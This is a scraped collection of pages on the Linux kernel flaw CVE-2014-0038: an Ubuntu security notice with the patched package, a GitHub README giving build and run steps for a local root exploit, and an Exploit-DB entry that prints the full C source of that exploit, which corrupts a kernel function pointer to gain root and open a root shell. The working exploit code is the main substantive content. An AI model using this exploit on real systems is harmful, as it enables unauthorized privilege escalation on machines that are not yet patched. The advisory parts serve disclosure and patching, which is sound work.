  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.ubuntu.com_3b22dc46_20250124_220346.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-2094-1: Linux kernel (Raring HWE) vulnerability

31 January 2014

The system could be made to crash or run programs as an administrator.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 12.04](/security/notices?release=precise)

## Packages

* [linux-lts-raring](/security/cves?package=linux-lts-raring) - Linux hardware enablement kernel from Raring

## Details

Pageexec reported a bug in the Linux kernel's recvmsg syscall when called

from code using the x32 ABI. An unprivileged local user could exploit this

flaw to cause a denial of service (system crash) or gain administrator

privileges.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 12.04

* [linux-image-3.8.0-35-generic](https://launchpad.net/ubuntu/%2Bsource/linux-lts-raring)
  -
  [3.8.0-35.52~precise1](https://launchpad.net/ubuntu/%2Bsource/linux-lts-raring/3.8.0-35.52~precise1)

After a standard system update you need to reboot your computer to make

all the necessary changes.

## References

* [CVE-2014-0038](/security/CVE-2014-0038)

## Related notices

* [USN-2095-1](/security/notices/USN-2095-1)
* [USN-2096-1](/security/notices/USN-2096-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from github.com_ed1b5355_20250124_220426.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsaelo%2Fcve-2014-0038)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsaelo%2Fcve-2014-0038)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=saelo%2Fcve-2014-0038)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[saelo](/saelo)
/
**[cve-2014-0038](/saelo/cve-2014-0038)**
Public

* [Notifications](/login?return_to=%2Fsaelo%2Fcve-2014-0038) You must be signed in to change notification settings
* [Fork
  47](/login?return_to=%2Fsaelo%2Fcve-2014-0038)
* [Star
   192](/login?return_to=%2Fsaelo%2Fcve-2014-0038)

Linux local root exploit for CVE-2014-0038

[192
stars](/saelo/cve-2014-0038/stargazers) [47
forks](/saelo/cve-2014-0038/forks) [Branches](/saelo/cve-2014-0038/branches) [Tags](/saelo/cve-2014-0038/tags) [Activity](/saelo/cve-2014-0038/activity)
 [Star](/login?return_to=%2Fsaelo%2Fcve-2014-0038)

 [Notifications](/login?return_to=%2Fsaelo%2Fcve-2014-0038) You must be signed in to change notification settings

* [Code](/saelo/cve-2014-0038)
* [Issues
  1](/saelo/cve-2014-0038/issues)
* [Pull requests
  0](/saelo/cve-2014-0038/pulls)
* [Actions](/saelo/cve-2014-0038/actions)
* [Projects
  0](/saelo/cve-2014-0038/projects)
* [Wiki](/saelo/cve-2014-0038/wiki)
* [Security](/saelo/cve-2014-0038/security)
* [Insights](/saelo/cve-2014-0038/pulse)

Additional navigation options

* [Code](/saelo/cve-2014-0038)
* [Issues](/saelo/cve-2014-0038/issues)
* [Pull requests](/saelo/cve-2014-0038/pulls)
* [Actions](/saelo/cve-2014-0038/actions)
* [Projects](/saelo/cve-2014-0038/projects)
* [Wiki](/saelo/cve-2014-0038/wiki)
* [Security](/saelo/cve-2014-0038/security)
* [Insights](/saelo/cve-2014-0038/pulse)

# saelo/cve-2014-0038

    master[Branches](/saelo/cve-2014-0038/branches)[Tags](/saelo/cve-2014-0038/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[15 Commits](/saelo/cve-2014-0038/commits/master/) | | |
| [README.md](/saelo/cve-2014-0038/blob/master/README.md "README.md") | | [README.md](/saelo/cve-2014-0038/blob/master/README.md "README.md") |  |  |
| [addresses](/saelo/cve-2014-0038/blob/master/addresses "addresses") | | [addresses](/saelo/cve-2014-0038/blob/master/addresses "addresses") |  |  |
| [build.sh](/saelo/cve-2014-0038/blob/master/build.sh "build.sh") | | [build.sh](/saelo/cve-2014-0038/blob/master/build.sh "build.sh") |  |  |
| [timeoutpwn.c](/saelo/cve-2014-0038/blob/master/timeoutpwn.c "timeoutpwn.c") | | [timeoutpwn.c](/saelo/cve-2014-0038/blob/master/timeoutpwn.c "timeoutpwn.c") |  |  |
| View all files | | |

## Repository files navigation

* README
# Local root exploit for CVE-2014-0038

## Bug:

The X86\_X32 recvmmsg syscall does not properly sanitize the timeout pointer
passed from userspace.

## Exploit primitive:

Pass a pointer to a kernel address as timeout for recvmmsg,
if the original byte at that address is known it can be overwritten
with known data.
If the least significant byte is 0xff, waiting 255 seconds will turn it into a 0x00.

## Restrictions:

The first long at the passed address (tv\_sec) has to be positive
and the second long (tv\_nsec) has to be smaller than 1000000000.

## Overview:

Target the release function pointer of the ptmx\_fops structure located in
non initialized (and thus writable) kernel memory. Zero out the three most
significant bytes and thus turn it into a pointer to an address mappable in
user space.
The release pointer is used as it is followed by 16 0x00 bytes (so the tv\_nsec
is valid).
Open /dev/ptmx, close it and enjoy.

Not very beautiful but should be fairly reliable if symbols can be resolved.

Tested on Ubuntu 13.10

See also <http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html>

## Run:

Retrieve addresses from `/proc/kallsyms` and run the exploit:

```
./build.sh && ./timeoutpwn

```

If you would like to build the binary for a remote server, try this:

```
ssh user@host 'cat /proc/kallsyms' > syms.txt
CFLAGS=-static ./build.sh syms.txt
scp timeoutpwn user@host:
...

```

If `ptmx_fops` cannot be found in kallsyms, try extracting it from the vmlinux
as provided with the headers package (`linux-headers` on Arch Linux):

```
nm /lib/modules/$(uname -r)/build/vmlinux > syms.txt

```

## About

Linux local root exploit for CVE-2014-0038

### Topics

[linux](/topics/linux "Topic: linux")
[kernel](/topics/kernel "Topic: kernel")
[exploit](/topics/exploit "Topic: exploit")

### Resources

[Readme](#readme-ov-file)

[Activity](/saelo/cve-2014-0038/activity)
### Stars

[**192**
stars](/saelo/cve-2014-0038/stargazers)
### Watchers

[**18**
watching](/saelo/cve-2014-0038/watchers)
### Forks

[**47**
forks](/saelo/cve-2014-0038/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsaelo%2Fcve-2014-0038&report=saelo+%28user%29)

## [Releases](/saelo/cve-2014-0038/releases)

No releases published

## [Packages 0](/users/saelo/packages?repo_name=cve-2014-0038)

No packages published

## [Contributors 3](/saelo/cve-2014-0038/graphs/contributors)

## Languages

* [C
  91.4%](/saelo/cve-2014-0038/search?l=c)
* [Shell
  8.6%](/saelo/cve-2014-0038/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugzilla.novell.com_5ecac4c4_20250126_034918.html ===




=== Content from www.exploit-db.com_7046bb24_20250124_220338.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG\_X86\_X32' Arbitrary Write (2)

#### EDB-ID:

###### 31346

#### CVE:

###### [2014-0038](https://nvd.nist.gov/vuln/detail/CVE-2014-0038)

---

**EDB Verified:**

#### Author:

###### [saelo](/?author=6894)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2014-02-02

---

**Vulnerable App:**

```
/*
 * Local root exploit for CVE-2014-0038.
 *
 * https://raw.github.com/saelo/cve-2014-0038/master/timeoutpwn.c
 *
 * Bug: The X86_X32 recvmmsg syscall does not properly sanitize the timeout pointer
 * passed from userspace.
 *
 * Exploit primitive: Pass a pointer to a kernel address as timeout for recvmmsg,
 * if the original byte at that address is known it can be overwritten
 * with known data.
 * If the least significant byte is 0xff, waiting 255 seconds will turn it into a 0x00.
 *
 * Restrictions: The first long at the passed address (tv_sec) has to be positive
 * and the second long (tv_nsec) has to be smaller than 1000000000.
 *
 * Overview: Target the release function pointer of the ptmx_fops structure located in
 * non initialized (and thus writable) kernel memory. Zero out the three most
 * significant bytes and thus turn it into a pointer to an address mappable in
 * user space.
 * The release pointer is used as it is followed by 16 0x00 bytes (so the tv_nsec
 * is valid).
 * Open /dev/ptmx, close it and enjoy.
 *
 * Not very beautiful but should be fairly reliable if symbols can be resolved.
 *
 * Tested on Ubuntu 13.10
 *
 * gcc timeoutpwn.c -o pwn && ./pwn
 *
 * Written by saelo
 */
#define _GNU_SOURCE
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mman.h>

#define __X32_SYSCALL_BIT 0x40000000
#undef __NR_recvmmsg
#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)

#define BUFSIZE 200
#define PAYLOADSIZE 0x2000
#define FOPS_RELEASE_OFFSET 13*8

/*
 * Adapt these addresses for your need.
 * see /boot/System.map* or /proc/kallsyms
 * These are the offsets from ubuntu 3.11.0-12-generic.
 */
#define PTMX_FOPS           0xffffffff81fb30c0LL
#define TTY_RELEASE         0xffffffff8142fec0LL
#define COMMIT_CREDS        0xffffffff8108ad40LL
#define PREPARE_KERNEL_CRED 0xffffffff8108b010LL

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

/*
 * Match signature of int release(struct inode*, struct file*).
 *
 * See here: http://grsecurity.net/~spender/exploits/enlightenment.tgz
 */
int __attribute__((regparm(3)))
kernel_payload(void* foo, void* bar)
{
    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;    // restore pointer
    commit_creds(prepare_kernel_cred(0));

    return -1;
}

/*
 * Write a zero to the byte at then given address.
 * Only works if the current value is 0xff.
 */
void zero_out(long addr)
{
    int sockfd, retval, port, pid, i;
    struct sockaddr_in sa;
    char buf[BUFSIZE];
    struct mmsghdr msgs;
    struct iovec iovecs;

    srand(time(NULL));

    port = 1024 + (rand() % (0x10000 - 1024));

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port        = htons(port);
    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }

    memset(&msgs, 0, sizeof(msgs));
    iovecs.iov_base         = buf;
    iovecs.iov_len          = BUFSIZE;
    msgs.msg_hdr.msg_iov    = &iovecs;
    msgs.msg_hdr.msg_iovlen = 1;

    /*
     * start a seperate process to send a udp message after 255 seconds so the syscall returns,
     * but not after updating the timout struct and writing the remaining time into it.
     * 0xff - 255 seconds = 0x00
     */
    printf("clearing byte at 0x%lx\n", addr);
    pid = fork();
    if (pid == 0) {
        memset(buf, 0x41, BUFSIZE);

        if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
            perror("socket()");
            exit(EXIT_FAILURE);
        }

        sa.sin_family      = AF_INET;
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        sa.sin_port        = htons(port);

        printf("waiting 255 seconds...\n");
        for (i = 0; i < 255; i++) {
        if (i % 10 == 0)
                printf("%is/255s\n", i);
        sleep(1);
        }

        printf("waking up parent...\n");
        sendto(sockfd, buf, BUFSIZE, 0, &sa, sizeof(sa));
        exit(EXIT_SUCCESS);
    } else if (pid > 0) {
        retval = syscall(__NR_recvmmsg, sockfd, &msgs, 1, 0, (void*)addr);
        if (retval == -1) {
            printf("address can't be written to, not a valid timespec struct\n");
            exit(EXIT_FAILURE);
        }
        waitpid(pid, 0, 0);
        printf("byte zeroed out\n");
    } else {
      perror("fork()");
      exit(EXIT_FAILURE);
    }
}

int main(int argc, char** argv)
{
    long code, target;
    int pwn;

    /* Prepare payload... */
    printf("preparing payload buffer...\n");
    code = (long)mmap((void*)(TTY_RELEASE & 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
    memset((void*)code, 0x90, PAYLOADSIZE);
    code += PAYLOADSIZE - 1024;
    memcpy((void*)code, &kernel_payload, 1024);

    /*
     * Now clear the three most significant bytes of the fops pointer
     * to the release function.
     * This will make it point into the memory region mapped above.
     */
    printf("changing kernel pointer to point into controlled buffer...\n");
    target = PTMX_FOPS + FOPS_RELEASE_OFFSET;
    zero_out(target + 7);
    zero_out(target + 6);
    zero_out(target + 5);

    /* ... and trigger. */
    printf("releasing file descriptor to call manipulated pointer in kernel mode...\n");
    pwn = open("/dev/ptmx", 'r');
    close(pwn);

    if (getuid() != 0) {
        printf("failed to get root :(\n");
        exit(EXIT_FAILURE);
    }

    printf("got root, enjoy :)\n");
    return execl("/bin/bash", "-sh", NULL);
}

```

**Tags:**

[![](/screenshots/idlt31500/screen-shot-2014-02-02-at-42534-pm-thumb.png)](/screenshots/idlt31500/screen-shot-2014-02-02-at-42534-pm.png)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
